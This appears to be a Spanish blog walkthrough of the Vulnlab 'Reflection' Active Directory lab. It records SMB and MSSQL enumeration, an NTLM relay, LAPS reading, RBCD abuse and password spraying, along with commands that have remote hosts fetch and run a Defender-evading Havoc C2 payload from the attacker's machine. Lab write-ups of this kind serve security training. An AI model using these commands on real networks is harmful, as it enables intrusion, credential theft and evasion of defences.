---
layout: single
title: Reflection Vulnlab Chain
excerpt: "En este artículo vamos a resolver el laboratorio Reflection de la plataforma Vulnlab. Para ello haremos cosas tan chulas como un relay de credenciales desde un mssqlclient, o una explotación de rbcd teniendo el machine account quota a cero."
date: 2024-08-14
classes: wide
header:
  teaser: /assets/images/Reflection/Reflection-logo.png
  teaser_home_page: true
categories:
  - Ciberseguridad
tags:
  - Windows
  - Active Directory
---

![](/assets/images/Reflection/Reflection-logo.png)


En este artículo vamos a resolver el laboratorio Reflection de la plataforma Vulnlab. Para ello haremos cosas tan chulas como un relay de credenciales desde un mssqlclient, o una explotación de rbcd teniendo el machine account quota a cero.


El laboratorio consta de 3 máquinas windows, con las siguientes direcciones ip:

- 10.10.149.149
- 10.10.149.150
- 10.10.149.151


Empezamos con un escaneo de puertos con nmap.

![](/assets/images/Reflection/reflection-nmap.png)


```bash
$ nmap -sV -Pn 10.10.149.149-151 -oN scan.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-14 18:10 CEST
Nmap scan report for dc01.reflection.vl (10.10.149.149)
Host is up (0.042s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-14 16:11:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for ms01.reflection.vl (10.10.149.150)
Host is up (0.043s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for ws01.reflection.vl (10.10.149.151)
Host is up (0.042s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 19.08 seconds
```

Destacar que el DC tiene abierto el SQLServer y el equipo MS01 también.

Configuramos el fichero hosts de la siguiente forma para la resolución de nombres:

10.10.149.149 dc01.reflection.vl  
10.10.149.150 ms01.reflection.vl  
10.10.149.151 ws01.reflection.vl  


Vamos a enumerar los equipos con Netexec.

```bash
$ nxc smb 10.10.149.149-151
SMB         10.10.149.150   445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.149.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.149.151   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```


![](/assets/images/Reflection/reflection-nxc-inicial.png)



Ya podemos ver que ninguna de las 3 máquinas tiene el smb firmado, lo cual aprovecharemos más adelante.


Con smbclient vamos a ver si algún equipo permite listar los recursos compartidos sin proporcionar credenciales.


```bash
$ smbclient -L \\dc01.reflection.vl
Password for [WORKGROUP\root]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```


```bash
$ smbclient -L \\ms01.reflection.vl
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        staging         Disk      staging environment
SMB1 disabled -- no workgroup available
```

```bash
$ smbclient -L \\ws01.reflection.vl
Password for [WORKGROUP\root]:
session setup failed: NT_STATUS_ACCESS_DENIED
```

![](/assets/images/Reflection/reflection-smb1.png)


Y vemos que el único equipo que lo permite es el ms01.


Nos conectamos al recurso compartido staging, descargamos el fichero que contiene y vemos que tiene credenciales.


```bash
$ smbclient \\\\ms01.reflection.vl\\staging
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  7 19:42:48 2023
  ..                                  D        0  Wed Jun  7 19:41:25 2023
  staging_db.conf                     A       50  Thu Jun  8 13:21:49 2023

                6261245 blocks of size 4096. 1781583 blocks available
smb: \> get staging_db.conf
getting file \staging_db.conf of size 50 as staging_db.conf (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```


![](/assets/images/Reflection/reflection-smb2.png)



```bash
$ cat staging_db.conf
user=web_staging
password=Washroom510
db=staging
```


Con esas credenciales podemos conectarnos al equipo ms01.


```bash
$ mssqlclient.py web_staging:Washroom510@ms01.reflection.vl
Impacket v0.12.0.dev1+20240604.210053.9734a1af - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MS01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MS01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (web_staging  guest@master)>
```


Listamos las bases de datos, luego elejimos la bd staging, listamos las tablas y luego los datos de la tabla users.


```bash
$ SQL (web_staging  guest@master)> SELECT name FROM master.dbo.sysdatabases;
name
-------
master

tempdb

model

msdb

staging

$ SQL (web_staging  guest@master)> use staging;
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: staging
[*] INFO(MS01\SQLEXPRESS): Line 1: Changed database context to 'staging'.
SQL (web_staging  dbo@staging)> SELECT * FROM staging.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE
-------------   ------------   ----------   ----------
staging         dbo            users        b'BASE TABLE'

$ SQL (web_staging  dbo@staging)> select * from users;
id   username   password
--   --------   -------------
 1   b'dev01'   b'Initial123'

 2   b'dev02'   b'Initial123'
```


![](/assets/images/Reflection/reflection-sql1.png)


Probamos a habilitar xp_cmdshell pero nos dice que no tenemos permiso.

```bash
$ SQL (web_staging  dbo@staging)> enable_xp_cmdshell
ERROR: Line 1: You do not have permission to run the RECONFIGURE statement.
```

Con xp_dirtree tampoco nos deja listar contenido de la máquina. Pero podemos realizar una petición a nuestra máquina, y ver si capturamos el hash netntlmv2 para intentar crackearlo.


```bash
$ Responder.py -I tun0
```

```bash
$ xp_dirtree \\10.8.2.14\test
```

![](/assets/images/Reflection/reflection-sql2.png)

![](/assets/images/Reflection/reflection-responder.png)



Y recibimos el hash del usuario svc_web_staging. En este punto intenté crackearlo con hashcat y el rockyou pero por lo visto es una contraseña robusta y no fué posible.


Ya que podemos hacer una petición smb a nuestra máquina, y aprovechando que ninguna de las 3 máquinas del laboratorio tiene el smb firmado, podemos hacer un relay para autenticarnos contra el dc01 con el hash que obtenemos.


Para ello utilizamos ntlmrelayx para que al recibir la autenticación de ms01 nos cree un proxy socks con esas credenciales que podremos utilizar para loguearnos en el dc01 a través de proxychains.


Creamos un fichero targets.txt con la ip del dc01 ya que este será nuestro objetivo y ejecutamos ntlmrelayx con las siguientes opciones:


```bash
$ ntlmrelayx -tf targets.txt -smb2support -socks
```


Y luego desde el mssqlclient volvemos a ejecutar el comando xp_dirtree contra nuestra máquina.

```bash
$ xp_dirtree \\10.8.2.14\test
```


![](/assets/images/Reflection/reflection-ntlmrelayx.png)



Y vemos que nos dice que se ha producido la autenticación en dc01 y que el proxy socks está listo.

```bash
[*] Authenticating against smb://10.10.149.149 as REFLECTION/SVC_WEB_STAGING SUCCEED
[*] SOCKS: Adding REFLECTION/SVC_WEB_STAGING@10.10.149.149(445) to active SOCKS connection. Enjoy
```

Ahora viene lo interesante, podemos utilizar proxychains para listar los recursos compartidos del dc01, utilizando el reenvío de credenciales y sin proporcionar credenciales, ya que al utilizar el proxy socks que hemos creado, el comando se ejecutará en el contexto del usuario svc_web_staging, aunque no pongamos ninguna contraseña.


```bash
$ proxychains -q smbclient -L \\10.10.149.149 -U reflection/svc_web_staging
Password for [REFLECTION\svc_web_staging]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        prod            Disk
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```

Nos conectamos al recurso compartido prod y descargamos el fichero, que contiene nuevas credenciales. 


```bash
$ proxychains -q smbclient \\\\10.10.191.5\\prod -U reflection/svc_web_staging
```


![](/assets/images/Reflection/reflection-smb3.png)


user=web_prod  
password=Trib********  
db=prod  



Al igual que hemos hecho antes, listamos las bases de datos, luego las tablas y luego los datos de la tabla users. Y obtenemos nuevas credenciales.




![](/assets/images/Reflection/reflection-sql3.png)


abbie.smith:CMe1x*********  
dorothy.rose:hC_fny3*******  


Con netexec comprobamos que las credenciales son válidas.


```bash
$ nxc smb 10.10.149.149-151 -u 'abbie.smith' -p 'CMe1x*********'
```

```bash
nxc smb 10.10.149.149-151 -u 'dorothy.rose' -p 'hC_fny3*******'
```

![](/assets/images/Reflection/reflection-nxc2.png)


Ya podemos utilizar bloodhound para buscar vulnerabilidades utilizando estas credenciales.


```bash
$ bloodhound.py --zip -c All -d "reflection.vl" -u "abbie.smith" -p "CMe1x*********" -dc "dc01.reflection.vl" -ns 10.10.149.149
```


Y vemos con bloodhound que el usuario abbie.smith tiene permisos de GenericAll sobre la máquina MS01.


![](/assets/images/Reflection/reflection-bh.png)


Bloodhound nos sugiere utilizar el ataque Resource Based Constrained Delegation, pero vemos que el machine account quota está a cero, con lo cual no vamos a poder crear ninguna cuenta de máquina con nuestro usuario.


![](/assets/images/Reflection/reflection-bh2.png)


```bash
nxc ldap 10.10.149.149 -u 'abbie.smith' -p 'CMe1x*********' -M maq
```


![](/assets/images/Reflection/reflection-maq.png)


Enumerando el dominio con bloodhound busco por LAPS para ver si está implementado en la máquina y veo que si. Y como tenemos permisos de GenericAll podemos ver la contraseña, con nxc por ejemplo.


```bash
$ nxc ldap 10.10.149.149 -u 'abbie.smith' -p 'CMe1x*********' -M laps
```


![](/assets/images/Reflection/reflection-laps.png)

![](/assets/images/Reflection/reflection-laps2.png)


Ahora que ya tenemos credenciales de administrador vamos a utilizar [Havoc](https://github.com/HavocFramework/Havoc) para recibir las conexiones, y luego utilizaremos [donut](https://github.com/TheWover/donut) y [ScareCrow](https://github.com/Tylous/ScareCrow) para bypassear el defender.


Creamos un listener en Havoc del tipo https en el puerto 443.

![](/assets/images/Reflection/reflection-listener.png)


Y luego creamos un agente que se conecte a el listener, en este caso en formato exe.


![](/assets/images/Reflection/reflection-agent.png)


Ahora para evadir el defender lo hacemos así:


```bash
$ ./donut -i payload.exe -a ax64 -o payload.bin
```

```bash
$ ./ScareCrow -I /workspace/Chains/Reflection/payload.bin --domain microsoft.com
```

Estos comandos nos generan un archivo Outlook.exe (en este caso) que será el que utilizaremos para que al ejecutarlo en las máquinas nos devuelva una conexión a nuestro C2 Havoc.


A continuación ejecutamos el siguiente comando para que descargue el archivo Outlook.exe de nuestra máquina y luego lo ejecute.


```bash
$ atexec.py 'Administrator':'H447.*********'@'ms01.reflection.vl' 'powershell -c "iwr http://10.8.2.14/Outlook.exe -o C:\programdata\Outlook.exe;C:\programdata\Outlook.exe"'
```


![](/assets/images/Reflection/reflection-atexec1.png)


Y recibimos la conexión en Havoc.


![](/assets/images/Reflection/reflection-havoc1.png)


Ya podemos leer la primera flag ejecutando `powershell cat C:\Users\Administrator\Desktop\flag.txt`


![](/assets/images/Reflection/reflection-flag1.png)


Seguidamente vamos a buscar credenciales en el equipo que nos puedan servir para movimientos laterales, y para ello utilizaremos SharpDPAPI desde el propio Havoc con la opción otnet inline-execution` que lo ejecutará en memoria.

```bash
dotnet inline-execute /workspace/Chains/Reflection/SharpDPAPI.exe machinetriage
```


![](/assets/images/Reflection/reflection-dpapi.png)


Y obtenemos nuevas credenciales:

REFLECTION\Georgia.Price:DBl+5M********  


Buscamos el usuario en bloodhound y vemos que tiene GenericAll sobre la máquina WS01.


![](/assets/images/Reflection/reflection-bh3.png)


En esta ocasión la máquina no tiene LAPS, con lo cual teniendo el machine account quota a cero y sin LAPS se complica un poco la cosa.

Vamos a ejecutar secretsdump para ver si encontramos una cuenta de máquina, de la cual podamos utilizar el hash para el ataque rbcd (Resource Based Constrained Delegation).


```bash
$ secretsdump 'MS01/Administrator':'H447.*********'@MS01.reflection.vl
```

![](/assets/images/Reflection/reflection-secretsdump.png)


Con esto hemos conseguido una cuenta de máquina (MS01$) y su hash, todo lo que necesitábamos para el ataque.



REFLECTION\MS01$:aad3b435b51404eeaad3b435b51404ee:a9ea56d5339b8c13fdb1d89a1661d0c5



```bash
$ rbcd.py -delegate-from 'MS01$' -delegate-to 'WS01$' -dc-ip "10.10.158.229" -action write "reflection"/"Georgia.Price":"DBl+5M********"
```

![](/assets/images/Reflection/reflection-rbcd.png)


Vemos que nos dice, 

```bash
[*] Accounts allowed to act on behalf of other identity:
[*]     MS01$        (S-1-5-21-3375389138-1770791787-1490854311-1104)
```

O sea que la cuenta MS01 ahora tiene permitido actuar en nombre de otra cuenta en WS01.


Podemos pedir un TGS o ticket de servicio impersonando al administrador de WS01.


```bash
$ getST.py -spn CIFS/"WS01.reflection.vl" -impersonate Administrator -dc-ip "10.10.158.229" "reflection"/"MS01$" -hashes :a9ea56d5339b8c13fdb1d89a1661d0c5
```


Con este comando pedimos un TGS con el spn CIFS ya que queremos acceder al sistema de ficheros, impersonando al administrador, y utilizando el hash de la cuenta MS01$.


![](/assets/images/Reflection/reflection-getst.png)


Ahora asignamos el ticket a la variable de entorno KRB5CCNAME para poder utilizarlo en linux.


```bash
$ export KRB5CCNAME=$PWD/Administrator@CIFS_WS01.reflection.vl@REFLECTION.VL.ccache
```


Como tenemos importado el ticket del administrador de WS01 podemos utilizar secretsdump para volcar los hashes.


```bash
$ secretsdump -k -no-pass 'Administrator'@'WS01.reflection.vl'
```


![](/assets/images/Reflection/reflection-secretsdump2.png)


Y conseguimos nuevas credenciales. Además como tenemos el hash del administrador podemos conectar la máquina a nuestro C2 Havoc de la misma forma que antes.

reflection.vl\Rhys.Garner:knh1g*******  


```bash
$ atexec.py -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 'WS01/Administrator'@'10.10.158.231' 'powershell.exe -c "iwr http://10.8.2.14/Outlook.exe -o C:\programdata\Outlook.exe;C:\programdata\Outlook.exe"' -dc-ip 10.10.158.229
```


![](/assets/images/Reflection/reflection-atexec2.png)


Y nos llega la conexión a nuestro Havoc. Ya podemos leer la segunda flag.



![](/assets/images/Reflection/reflection-flag2.png)



Ahora vamos a por el controlador de dominio. Sacamos una lista de usuarios:

```bash
$ nxc smb 10.10.158.229 -u Rhys.Garner -p 'knh1g********' --users
```

Y hacemos spraying de la contraseña.


```bash
$ nxc smb 10.10.158.229 -u users_clean.txt -p 'knh1g********' --continue-on-succes
SMB         10.10.158.229   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.158.229   445    DC01             [-] reflection.vl\Administrator:knh1g******** STATUS_LOGON_FAILURE
SMB         10.10.158.229   445    DC01             [-] reflection.vl\Guest:knh1g******** STATUS_LOGON_FAILURE
SMB         10.10.158.229   445    DC01             [-] reflection.vl\krbtgt:knh1g******** STATUS_LOGON_FAILURE
SMB         10.10.158.229   445    DC01             [-] reflection.vl\labadm:knh1g******** STATUS_LOGON_FAILURE
SMB         10.10.158.229   445    DC01             [-] reflection.vl\Georgia.Price:knh1g******** STATUS_LOGON_FAILURE
SMB         10.10.158.229   445    DC01             [-] reflection.vl\Michael.Wilkinson:knh1g******** STATUS_LOGON_FAILURE
SMB         10.10.158.229   445    DC01             [-] reflection.vl\Bethany.Wright:knh1g******** STATUS_LOGON_FAILURE
SMB         10.10.158.229   445    DC01             [-] reflection.vl\Craig.Williams:knh1g******** STATUS_LOGON_FAILURE
SMB         10.10.158.229   445    DC01             [-] reflection.vl\Abbie.Smith:knh1g******** STATUS_LOGON_FAILURE
SMB         10.10.158.229   445    DC01             [-] reflection.vl\Dorothy.Rose:knh1g******** STATUS_LOGON_FAILURE
SMB         10.10.158.229   445    DC01             [-] reflection.vl\Dylan.Marsh:knh1g******** STATUS_LOGON_FAILURE
SMB         10.10.158.229   445    DC01             [+] reflection.vl\Rhys.Garner:knh1g********
SMB         10.10.158.229   445    DC01             [-] reflection.vl\Jeremy.Marshall:knh1g******** STATUS_LOGON_FAILURE
SMB         10.10.158.229   445    DC01             [-] reflection.vl\Deborah.Collins:knh1g******** STATUS_LOGON_FAILURE
SMB         10.10.158.229   445    DC01             [-] reflection.vl\svc_web_prod:knh1g******** STATUS_LOGON_FAILURE
SMB         10.10.158.229   445    DC01             [-] reflection.vl\svc_web_staging:knh1g******** STATUS_LOGON_FAILURE
SMB         10.10.158.229   445    DC01             [+] reflection.vl\dom_rgarner:knh1g******** (admin)
```

Y vemos que la cuenta dom_rgarner tiene la misma contraseña, y además es una cuenta que seguramente utiliza el mismo usuario pero con privilegios de domain admin.


Con lo cual podemos utilizar atexec como antes para conectar el DC a nuestro Havoc.


```bash
$ atexec.py 'reflection.vl/dom_rgarner':'knh1g********'@'dc01.reflection.vl' 'powershell -c "iwr http://10.8.2.14/Outlook.exe -o C:\programdata\Outlook.exe;C:\programdata\Outlook.exe"' -dc-ip 10.10.158.229
```


![](/assets/images/Reflection/reflection-atexec3.png)


Recibimos la conexión en nuestro Havoc y leemos la última flag.


![](/assets/images/Reflection/reflection-flag3.png)

